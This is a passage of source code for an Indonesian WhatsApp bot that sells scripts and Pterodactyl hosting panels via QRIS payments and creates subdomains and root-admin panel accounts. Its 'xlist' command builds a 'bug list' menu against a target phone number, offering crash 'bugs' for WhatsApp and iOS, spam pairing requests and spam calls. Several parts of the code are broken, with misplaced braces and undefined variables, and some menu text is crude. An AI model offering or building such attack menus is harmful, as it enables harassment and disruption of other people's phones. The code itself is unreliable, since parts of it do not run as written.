const deletedScript = global.scripts.splice(scriptIndex - 1, 1)[0];

m.reply(`✅ *Script berhasil dihapus!*\n\n📜 *Nama*: ${deletedScript.name}`);
break;
}

case 'editscript': {
    if (!isOwner) return m.reply('❌ Akses Ditolak! Perintah ini hanya untuk pemilik.');

    if (!text) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/editscript <NomorScript> <Nama/Harga> <NilaiBaru>\n\nContoh:\n/editscript 1 Nama RafanoV5`
        );
    }

    const args = text.split(' ');
    if (args.length < 3) {
        return m.reply(
            `❌ *Format salah!*\nGunakan perintah:\n/editscript <NomorScript> <Nama/Harga> <NilaiBaru>\n\nContoh:\n/editscript 1 Nama RafanoV5`
        );
    }

    const [scriptIndex, field, ...newValueArray] = args;
    const newValue = newValueArray.join(' ');

    if (isNaN(scriptIndex) || scriptIndex < 1 || scriptIndex > (global.scripts || []).length) {
        return m.reply('❌ Nomor script tidak valid! Ketik `/listsc` untuk melihat daftar script.');
    }

    const scriptToEdit = global.scripts[scriptIndex - 1];

    // Validasi field
    if (!['Nama', 'Harga'].includes(field)) {
        return m.reply(
            `❌ Field tidak valid! Hanya dapat mengubah: Nama, Harga.\nContoh:\n/editscript 1 Nama RafanoV5`
        );
    }

    // Edit script berdasarkan field
    if (field === 'Nama') scriptToEdit.name = newValue;
    if (field === 'Harga') scriptToEdit.price = parseInt(newValue);

    m.reply(`✅ *Script berhasil diperbarui!*\n\n📜 *Nama*: ${scriptToEdit.name}\n💸 *Harga*: Rp${scriptToEdit.price.toLocaleString('id-ID')}`);
    break;
}

case 'buysc': {
    if (m.isGroup) return reply("❌ Fitur order hanya dapat digunakan dalam private chat.");

    if (db.users[m.sender].status_deposit) {
        return Kenz.sendMessage(m.chat, {text: "Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!"});
    }

    let teks = `
    \`Untuk membeli Script, ketik perintah berikut:\`
    Contoh penggunaan: *.buysc <nomor>*
    ketik .listsc untuk melihat nomor sc
    `;
    }

    const choice = parseInt(text);

    if (!global.scripts || global.scripts.length === 0) {
        return m.reply('❌ Tidak ada script yang tersedia. Gunakan `/listsc` untuk melihat daftar.');
    }

    if (choice < 1 || choice > global.scripts.length) {
        return m.reply('❌ Pilihan tidak valid! Ketik `/listsc` untuk melihat daftar script.');
    }

    const selectedScript = global.scripts[choice - 1];
    const amount = selectedScript.price + Math.floor(Math.random() * 200 + 100);
const formattedTime = `${hours}:${minutes}`;
        
const teks3 = `
    *🛒 DETAIL PEMBELIAN SCRIPT*\n\n
    *Nama Script*: ${selectedScript.name}\n
    *Harga*: Rp. ${selectedScript.price.toLocaleString('id-ID')}\n\n
    Silahkan scan QRIS di atas sebelum ${formattedTime} WIB untuk pembayaran.
`;
        m.reply(teks3);

    try {
        const UrlQr = global.qrisOrderKuota;
        const paymentResponse = await axios.get(
            `https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`
        );

        if (!paymentResponse.data || !paymentResponse.data.result) {
            console.error('API Pembayaran Error:', paymentResponse.data);
            return m.reply('❌ Gagal memproses pembayaran, coba lagi nanti.');
        }

        const paymentData = paymentResponse.data.result;

        let msgQr = await Kenz.sendMessage(m.chat,

    { image: { url: paymentData.qrImageUrl }, caption: teks3 }, { quoted: m });

        db.users[m.sender].status_deposit = true;

        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: paymentData.transactionId,
            amount: paymentData.amount.toString(),
            nominal: amount,
            exp: function () {
                setTimeout(async () => {
                    if (user.status_deposit === true && user.saweria && user.saweria.amount) {
                        await Kenz.sendMessage(user.saweria.chat, {
                            text: "❌ QRIS Pembayaran telah expired!"
                        }, { quoted: user.saweria.msg });

                        await Kenz.sendMessage(user.saweria.chat, {
                            delete: user.saweria.msg.key
                        });

                        user.status_deposit = false;
                        delete user.saweria;
                    }
                }, 300000); // 5 menit
            }
        };

        await db.users[m.sender].saweria.exp();

        while (db.users[m.sender].status_deposit === true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
            await sleep(15000); // Tidur selama 15 detik sebelum mengecek lagi
            const checkPayment = await axios.get(
                `https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`
            );
            const reqAmount = checkPayment.data.amount;

            if (reqAmount == db.users[m.sender].saweria.amount) {
                db.users[m.sender].status_deposit = false;

                m.reply(`
✅ Pembayaran berhasil, berikut adalah link untuk mengunduh script yang Anda pilih:

🔗 *Link Download*: ${selectedScript.url}
                `);

                delete db.users[m.sender].saweria;
                break;
            }
        }
    } catch (error) {
        console.error('Error:', error);
        m.reply('❌ Terjadi kesalahan saat memproses permintaan Anda.');
    }

    break;

case "subdomain": case "subdo": {
  if (!isCreator && !isPremium) return Reply(`Maaf Fitur Ini Khusus Reseller Domain`)
if (!text) return m.reply(example("Kenzoffc|ipserver"))
if (!text.split("|")) return m.reply(example("Kenzoffc|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await Kenz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2024 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//================================================================================

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Kenz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Kenz.sendMessage(orang, {text: teks}, {quoted: m})
}
break


case 'xpowxzz':
			case 'xlist': {
if (!text) return m.reply(example("628×××"))
let sundaq = text.replace(/[^0-9]/g, "")
if (sundaq.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = sundaq + '@s.whatsapp.net'
				const caption = `*\`B U G  L I S T\`*\ntarget: ${target}\n`;
				Kenz.sendMessage(m.chat,{
			 image: {url:"https://files.catbox.moe/u2795u.jpg"},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `Kenz bug anjai🗿`,
 buttons: [
 {
 buttonId: `.fixbug ${q}`,
 buttonText: {
 displayText: `fix bug ${target}`
 },
 type: 1,
 },
 {
 buttonId: `.spam-pairing ${q}|200`,
 buttonText: {
 displayText: 'spam pairing☠️'
 },
 type: 1,
 },
 {
 buttonId: 'action',
 buttonText: {
 displayText: 'ini pesan inte'
 },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'select bug type',
 sections: [
 {
 title: 'bug - list',
 highlight_label: '',
 rows: [
 {
 header: '',
 title: 'XCOMBO',
 description: 'combo bug + spam-pairing',
 id: `.xcombo ${q}`,
 }, 
 {
 header: '',
 title: 'X-IOS',
 description: 'bug untuk ios',
 id: `.xios ${q}`,
 },
 {
 header: '',
 title: 'spam call',
 description: 'rawan kenon',
 id: `.spam-call ${q}`,
 },
 ],
 },
 ],
 }),
 },
 },
 ],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			//Kenz si pler 🐎
break
//================================================================================

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Kenz.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//================================================================================

case 'menu-list':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.pathimg }, { upload: Kenz.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Populer",
 rows: [{
 header: 'Menu Install',
 title: "Menampilkan Menu Install Panel",
 description: `Cocok Untuk Panel Pterodactyl Anda`,
 id: `.menu-install`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Menu Panel🐣',
 title: "menampilkan menu Panel",
 description: `.`,
 id: `.menu-panel`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Menu Panel V2',
 title: "menampilkan menu Panel V2",
 description: `Membuat Panel Dengan Versi 2`,
 id: `.cpanel-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Menu Otomatis',
 title: "Menampilkan Menu Otomatis",
 description: `Tampilkan Menu Otomatis Yang Canggih `,
 id: `.menu-otomatis`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: 'Menu Store',
 title: "Menampilkan Menu Store",
 description: `.`,
 id: `.menu-store`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Download',
 title: "menampilkan menu download",
 description: `yang cepat dan canggih`,
 id: `.menu-download`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: 'Menu Push',
   title: "Menampilkan menu Push",
 description: ``,
 id: `.menu-push`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Vps',
 title: "Menampilkan Menu Vps",
 description: `Klik Untuk Melihat List Vps`,
 id: `.menu-vps`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Menu Sticker',
 title: "Menampilkan Menu Sticker",
 description: ``,
 id: `.menu-sticker`
 }]},{
 highlight_label: "",
 rows: [{
 header: '😈Owner😈',
 title: "Nomor Owner Botz",
 description: ``,
 id: `.owner`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "List Menu Bot Kenz",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break


case 'buypanel':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.buypanel }, { upload: Kenz.waUploadToServer })), 
									title: 'Silahkan Memilih Panel',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Populer",
 rows: [{
 header: '',
 title: "𝗣𝗮𝗸𝗲𝘁 𝗣𝗮𝗻𝗲𝗹 𝗣𝗿𝗶𝘃𝗮te",
 description: `Buy Panel Private`,
 id: `.buypanelprivate`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝗣𝗮𝗻𝗲𝗹 𝗣𝘂𝗯𝗹𝗶𝗰',
 title: "Buy Panel Public",
 description: ``,
 id: `.buypanelpublic`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "Menu Buy Panel",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break

//================================================================================

case 'buypanelprivate':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.pprivate }, { upload: Kenz.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Paket Private",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟭 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 1gb-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟮 𝗚𝗕',
 title: "© Kenz Satoru",
 description: `.`,
 id: `.buyp1 2gb-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟯 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 3gb-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟰 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 4gb-v2`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟱 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 5gb-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟲 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 6gb-v2`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟳 𝗚𝗕',
   title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 7gb-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟴 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 8gb-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟵 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 9gb-v2`
  }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 10 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp1 10gb-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱',
 title: "Membeli Panel Unlimited",
 description: `© Kenz Satoru`,
 id: `buyp1 unli-v2`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "List Panel Private Kenz Satoru",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break
case 'buypanelpublic':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.ppublic }, { upload: Kenz.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Paket Private",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟭 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 1gb-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟮 𝗚𝗕',
 title: "© Kenz Satoru",
 description: `.`,
 id: `.buyp2 2gb-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟯 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 3gb-v2`
 }]}, {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟰 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 4gb-v2`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟱 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 5gb-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟲 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 6gb-v2`
 }]},
 {
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟳 𝗚𝗕',
   title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 7gb-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟴 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 8gb-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝟵 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 9gb-v2`
  }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 10 𝗚𝗕',
 title: "Membeli Panel Ram 1GB",
 description: `© Kenz Satoru`,
 id: `.buyp2 10gb-v2`
 }]},{
 highlight_label: "",
 rows: [{
 header: '𝗣𝗮𝗸𝗲𝘁 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱',
 title: "Membeli Panel Unlimited",
 description: `© Kenz Satoru`,
 id: `buyp2 unli-v2`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "List Menu Panel Public Kenz Satoru",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break
case "buyp2": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *乂 List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buyp2* 1gb-v2
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb-v2") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb-v2") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb-v2") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb-v2") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb-v2") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb-v2") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb-v2") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb-v2") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb-v2") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb-v2") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli-v2" || cmd == "unlimited-v2") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

